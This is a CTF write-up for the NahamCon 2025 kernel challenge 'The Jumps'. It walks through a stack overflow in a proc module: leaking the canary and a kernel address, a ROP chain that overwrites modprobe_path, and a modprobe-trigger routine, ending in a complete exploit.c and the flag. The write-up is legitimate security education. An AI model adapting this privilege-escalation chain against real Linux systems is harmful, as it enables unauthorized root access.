---
title: "CTF NahamCon CTF 2025 - The Jumps [WRITE UP]"
tags:
    - Pwn
    - Kernel
    - Stack
    - BOF
    - Modprobe
category: "CTF Time"
---

This is a CTF Time Challenge, i saw it was simple kernel challenge might as well try to explain my thought process of doing this.

# Pwn - The Jumps

## Introduction 

![alt](/img/CTFTime/NahamCon_CTF_2025/TheJumps.png)

## Source Code

```sh
└─# tree the_jumps  
the_jumps
├── bzImage
├── Dockerfile
├── fs
│   ├── bin
│   │   └── busybox
│   ├── etc
│   │   └── passwd
│   ├── exploit
│   ├── flag
│   ├── home
│   │   └── ctf
│   ├── init
│   ├── proc
│   ├── root
│   ├── sbin
│   ├── sys
│   ├── thejumps.ko
│   └── usr
│       ├── bin
│       └── sbin
├── initramfs.cpio.gz
├── run.sh
└── vmlinux

13 directories, 11 files
```

`init` 
```sh
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t 9p -o trans=virtio,version=9p2000.L,nosuid hostshare /home/ctf
#for f in $(ls *.ko); do
#    insmod $f
#done
sysctl -w kernel.perf_event_paranoid=1

cat <<EOF

Boot took $(cut -d' ' -f1 /proc/uptime) seconds


Welcome to the lost and found store! Please look around to see if you can find the key to the flag. 


EOF
mkdir /home/user
adduser user -D
chmod 600 /flag
chown 0.0 /flag
insmod thejumps.ko
su user
#exec su -l ctf
```

#### `run.sh`
```bash
#!/bin/bash

read -p "Enter the link to your exploit binary: " link

wget $link -O exploit
chmod 777 ./exploit
sleep 1

cp ./exploit ./fs/exploit
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

qemu-system-x86_64 \
    -snapshot \
    -kernel bzImage \
    -smp cores=1,threads=1 \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 debug earlyprintk=serial oops=panic nokaslr smap smep selinux=0 tsc=unstable net.ifnames=0 panic=1000 cgroup_disable=memory" \
    -net nic -net user,hostfwd=tcp::${SSH_PORT}-:22 \
    -nographic \
    -m 128M \
    -monitor none,server,nowait,nodelay,reconnect=-1 \
    -cpu kvm64,+smap,+smep \
     2>&1
``` 

Upon reversing with the `thejumps.ko` there is an open, read, write, ioctl & exit function.

```c
__int64 __fastcall proc_read(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 result; // rax
  _QWORD v5[7]; // [rsp+0h] [rbp-38h] BYREF

  v5[4] = __readgsqword(0x28u);
  if ( a3 > 0x400 )
    return proc_read_cold();
  _memcpy(proc_data, v5, a3);
  LODWORD(result) = copy_to_user(a2, proc_data, a3);
  if ( !(_DWORD)result )
    LODWORD(result) = a3;
  return (int)result;
}

__int64 __fastcall proc_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  char *v4; // rdi
  __int64 v5; // rcx
  char *v6; // rsi
  __int64 v7; // [rsp+0h] [rbp-28h] BYREF
  char v8; // [rsp+8h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+20h] [rbp-8h]

  v9 = __readgsqword(0x28u);
  if ( cmd != 0x7301 )
    return -22LL;
  v4 = &v8;
  v5 = 6LL;
  v6 = proc_data;
  while ( v5 )
  {
    *(_DWORD *)v4 = 0;
    v4 += 4;
    --v5;
  }
  v7 = 0LL;
  _memcpy(&v7, v6, 1024LL);
  printk(&unk_2F1, &v7);
  return 0LL;
}

void __fastcall proc_write(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // [rsp+0h] [rbp-30h] BYREF
  __int64 v8; // [rsp+8h] [rbp-28h]
  __int64 v9; // [rsp+10h] [rbp-20h]
  __int64 v10; // [rsp+18h] [rbp-18h]
  unsigned __int64 v11; // [rsp+20h] [rbp-10h]

  v11 = __readgsqword(0x28u);
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  if ( a3 > 0x3FF )
  {
    proc_write_cold();
  }
  else if ( !(unsigned int)copy_from_user(proc_data, a2, a3 - 1, a4, a5, a6, v7, v8, v9, v10, v11) )
  {
    _memcpy(&v7, proc_data, a3);
    proc_data[a3] = 0;
  }
}

int __cdecl proc_init()
{
  char *v1; // rdi
  __int64 i; // rcx

  proc_data = (char *)_vmalloc(1024LL, 3264LL, _default_kernel_pte_mask & 0x163);
  if ( proc_data )
  {
    printk(&unk_2FE, proc_data);
    v1 = proc_data;
    for ( i = 256LL; i; --i )
    {
      *(_DWORD *)v1 = 0;
      v1 += 4;
    }
    if ( proc_create("shellcode_device", 438LL, 0LL, &proc_fops) )
    {
      printk(&unk_32A, 438LL);
      return 0;
    }
    else
    {
      printk(&unk_3B8, 438LL);
      return -12;
    }
  }
  else
  {
    printk(&unk_388, 0LL);
    return -12;
  }
}

void __cdecl proc_exit()
{
  kfree(proc_data);
  proc_data = 0LL;
  remove_proc_entry("shellcode_device", 0LL);
  printk(&unk_341, 0LL);
}
```

## Summary

When `open` the proc, there is a stack buffer overflow in the `write` function. We can leak the kernel address and the canary with `read` then `write` to control the `rip`. After control the `rip` use gadget like `mov qword ptr` to write the `modprobe_path` and do modprobe attack to get the flag.  

## Solution

To get started, i copy the `run.sh` debug.sh and change a bit of the configuration so it will be more easier to run the exploit.

`debug.sh`
```sh
#!/bin/bash

# read -p "Enter the link to your exploit binary: " link

# wget $link -O exploit
gcc exploit.c -o exploit --static
chmod 777 ./exploit
sleep 1

cp ./exploit ./fs/exploit
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

qemu-system-x86_64 \
    -snapshot \
    -kernel bzImage \
    -smp cores=1,threads=1 \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 debug earlyprintk=serial oops=panic nokaslr smap smep selinux=0 tsc=unstable net.ifnames=0 panic=1000 cgroup_disable=memory" \
    -net nic -net user,hostfwd=tcp::${SSH_PORT}-:22 \
    -nographic \
    -m 128M \
    -monitor none,server,nowait,nodelay,reconnect=-1 \
    -cpu kvm64,+smap,+smep \
     2>&1 \
    -s
```

Also to easier analyzing i'm going to use [gdb gef-kernel by bata24](https://github.com/destr4ct/gef-kernel). To faster run gdb i will make short script to run gdb to connect the kernel running.

`gdb.sh`
```sh
gdb-gef \
    -ex 'set arch i386:x86-64' \
    -ex 'target remote localhost:1234'
    -ex 'file vmlinux' \
    -ex 'ks-apply'
```


Usually when starting kernel explotation we need to leak the kernel address but since the chall giving us `nokaslr`, we don't need to leak the address but for dynamic incase the server run kaslr i will giving brief how to bypass kaslr too. To leaking the kernel address and the canary, we can do this by `open` and `read` the file.

```c
int fd = open(DEV_PATH, O_RDWR);
if (fd < 0) error("[-] Failed fd open");

char buffer[0x400];
read(fd, buffer, 0x150);
dump_hex(buffer, 0x150);
```

![alt](/img/CTFTime/NahamCon_CTF_2025/Dump.png)

The canary usually end with `00` and the kernel address around `0xffffffff81000000`. So we can guess the canary at index 19 and for the kernel address we can choose any idx that start with `0xffffffff8XXXXXX`. For calculating the offset we can use `xinfo` command in the `gdb-gef`.

![alt](/img/CTFTime/NahamCon_CTF_2025/GDBoffset.png)

```c
leak = ((unsigned long *)buffer)[10];
canary = ((unsigned long *)buffer)[19];
kernel_base = leak - 0x1c8a08;

info("canary", canary);  
info("leak", leak);
info("kernel_base", kernel_base);
```

![alt](/img/CTFTime/NahamCon_CTF_2025/CanaryKernel.png)

If you remember the `write` func in the proc has buffer overflow because of the memcopy from the `proc_data` to `v7`.

Lets now try if we can touch the the rip. From the result i found that canary offset is at 4 which is 0x28 and we can see after placing the canary the RIP is now our buffer.
```c
uint64_t payload[0x200];
int canary_idx = 4;
payload[canary_idx++] = canary;
payload[canary_idx++] = 0x0;
payload[canary_idx++] = 0x4242424242424242;

dump_hex((char *)payload, 0x40);
write(fd, (char *)payload, 0x40);
```

![alt](/img/CTFTime/NahamCon_CTF_2025/RIPpoc.png)

After that i tried doing kernel `commit creds` to escalate root but for some reason it call the `commit creds` 2 times. So i decided to go for modprobing.

To do the modprobing attack, i followed [this guide](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) where it explain the basic stack kernel exploitation to escalate root.

First we need to find the `modprobe_path` address and the gadget for writing the `modprobe_path`. To find the `modprobe_path` address we can use `/proc/kallsyms` but i use the feature in gdb gef-kernel `kmagic` command.

![alt](/img/CTFTime/NahamCon_CTF_2025/KMagic.png)

For the gadget i use `ROPgadgets` and `grep` to filter out the gadget available. I chose `rax` and `rdi` because they feel the most convenient for me. It can be any register as long sastify the `mov qword ptr`.

![alt](/img/CTFTime/NahamCon_CTF_2025/Gadgets.png)

After preparing all the gadgets i notice that the kernel don't have `/tmp` directory and we can't create it. But we our `/home/user` directory where we can create file. So i decided to use `/home/user` directory for modprobing attack.

To do this modprobing attack we need to make `modprobe_path` value to our executable script location so for this example i will use `/home/user/w`. Since `mov qword ptr` only write 8 byte, we need to call it 2 times.

```c
pop_rdi_ret = KADDR(0xffffffff81001518);
pop_rax_ret = KADDR(0xffffffff8100dc1e);
write_rax_to_rdi = KADDR(0xffffffff8104ebe2);
modprobe_path = KADDR(0xffffffff82444620);

info("pop_rdi_ret", pop_rdi_ret);
info("pop_rax_ret", pop_rax_ret);
info("write_rax_to_rdi", write_rax_to_rdi);
info("modprobe_path", modprobe_path);

... //continue after payload

payload[canary_idx++] = pop_rax_ret;
payload[canary_idx++] = 0x73752f656d6f682f;
payload[canary_idx++] = pop_rdi_ret;
payload[canary_idx++] = modprobe_path;
payload[canary_idx++] = write_rax_to_rdi;
payload[canary_idx++] = pop_rax_ret;
payload[canary_idx++] = 0x772f7265;
payload[canary_idx++] = pop_rdi_ret;
payload[canary_idx++] = modprobe_path + 0x8;
payload[canary_idx++] = write_rax_to_rdi;
```

Don't forget after finish write `/home/user/w` to modprobe_path we need to return to user mode using `swapgs_restore_regs_and_return_to_usermode` and also `savestate` before running the payload.

```c
payload[canary_idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
payload[canary_idx++] = 0; //pop from the return usermode
payload[canary_idx++] = 0; //pop from the return usermode
payload[canary_idx++] = 0x4141414141414141;
payload[canary_idx++] = user_cs;
payload[canary_idx++] = user_rflags;
payload[canary_idx++] = user_sp;
payload[canary_idx++] = user_ss;

dump_hex((char *)payload, 0xc0);
write(fd, (char *)payload, 0xc0);
```

![alt](/img/CTFTime/NahamCon_CTF_2025/Aftermodprobe.png)

If we see the modprobe_path value currently is `/home/user/w` our execute script.

![alt](/img/CTFTime/NahamCon_CTF_2025/modprobe_path_value.png)

Finally, we can create a function to abuse `modprobe_path`. I used the function from [the guide before](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) and made a few adjustments so it works with `/home/user`

```c
const char* arb_exec = 
"#!/bin/sh\n"
"cat /flag > /home/user/flag\n"
"chmod 777 /home/user/flag";

void abuse_modprobe() {
    puts("[+] Hello from user land!");
    if (stat("/home/user", &st) == -1) {
        puts("[*] Creating /home/user");
        int ret = mkdir("/home/user", S_IRWXU);
        if (ret == -1) {
            puts("[!] Failed");
            exit(-1);
        }
    }

    puts("[*] Setting up reading '/flag' as non-root user...");
    FILE *fptr = fopen(win_condition, "w");
    if (!fptr) {
        puts("[!] Failed to open win condition");
        exit(-1);
    }

    if (fputs(arb_exec, fptr) == EOF) {
        puts("[!] Failed to write win condition");
        exit(-1);
    }

    fclose(fptr);

    if (chmod(win_condition, S_IXUSR) < 0) {
        puts("[!] Failed to chmod win condition");
        exit(-1);
    };
    puts("[+] Wrote win condition -> /home/user/w");
    fptr = fopen(dummy_file, "w");
    if (!fptr) {
        puts("[!] Failed to open dummy file");
        exit(-1);
    }

    puts("[*] Writing dummy file...");
    if (fputs("\x37\x13\x42\x42", fptr) == EOF) {
        puts("[!] Failed to write dummy file");
        exit(-1);
    }
    fclose(fptr);
    
    if (chmod(dummy_file, S_ISUID|S_IXUSR) < 0) {
        puts("[!] Failed to chmod win condition");
        exit(-1);
    };
    puts("[+] Wrote modprobe trigger -> /home/user/d");

    puts("[*] Triggering modprobe by executing /home/user/d");
    execv(dummy_file, NULL);

    puts("[?] Hopefully GG");
    fptr = fopen(res, "r");
    if (!fptr) {
        puts("[!] Failed to open results file");
        exit(-1);
    }
    char *line = NULL;
    size_t len = 0;
    for (int i = 0; i < 8; i++) {
        uint64_t read = getline(&line, &len, fptr);
        printf("%s", line);
    }

    fclose(fptr);
}
```

```c
... //After the pop 2 times
payload[canary_idx++] = (uint64_t)abuse_modprobe;
payload[canary_idx++] = user_cs;
...
```

![alt](/img/CTFTime/NahamCon_CTF_2025/Solve.png)

### Solve Script
`exploit.c`
```C
#include "libpwn.c"

int main(){
  save_state();
  fd = open(DEV_PATH, O_RDWR);
  if (fd < 0) error("[-] Failed fd open");
  char buffer[0x400];
  read(fd, buffer, 0x150);
  dump_hex(buffer, 0x150);
  leak = ((unsigned long *)buffer)[10];
  canary = ((unsigned long *)buffer)[19];
  kernel_base = leak - 0x1c8a08;
  swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff81c00a2f);

  pop_rdi_ret = KADDR(0xffffffff81001518);
  pop_rax_ret = KADDR(0xffffffff8100dc1e);
  write_rax_to_rdi = KADDR(0xffffffff8104ebe2);
  modprobe_path = KADDR(0xffffffff82444620);
  info("canary", canary);  
  info("leak", leak);
  info("kernel_base", kernel_base);
  info("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode);
  info("pop_rdi_ret", pop_rdi_ret);
  info("pop_rax_ret", pop_rax_ret);
  info("write_rax_to_rdi", write_rax_to_rdi);
  info("modprobe_path", modprobe_path);

  uint64_t payload[0x200];
  int canary_idx = 4;
  payload[canary_idx++] = canary;
  payload[canary_idx++] = 0x0;
  payload[canary_idx++] = pop_rax_ret;
  payload[canary_idx++] = 0x73752f656d6f682f;
  payload[canary_idx++] = pop_rdi_ret;
  payload[canary_idx++] = modprobe_path;
  payload[canary_idx++] = write_rax_to_rdi;
  payload[canary_idx++] = pop_rax_ret;
  payload[canary_idx++] = 0x772f7265;
  payload[canary_idx++] = pop_rdi_ret;
  payload[canary_idx++] = modprobe_path + 0x8;
  payload[canary_idx++] = write_rax_to_rdi;
  payload[canary_idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
  payload[canary_idx++] = 0;
  payload[canary_idx++] = 0;
  payload[canary_idx++] = (uint64_t)abuse_modprobe;
  payload[canary_idx++] = user_cs;
  payload[canary_idx++] = user_rflags;
  payload[canary_idx++] = user_sp;
  payload[canary_idx++] = user_ss;

  dump_hex((char *)payload, 0xc0);
  write(fd, (char *)payload, 0xc0);  
}

```

For the `libpwn.c` can be see in the [github repo](https://github.com/Hazy0189/ctf-archieve/tree/main/CTFTime/2025/NahamCon%20CTF%202025/The%20Jumps).

### Flag

`flag{682cc8a83e022703fe1527b1b3bba748}`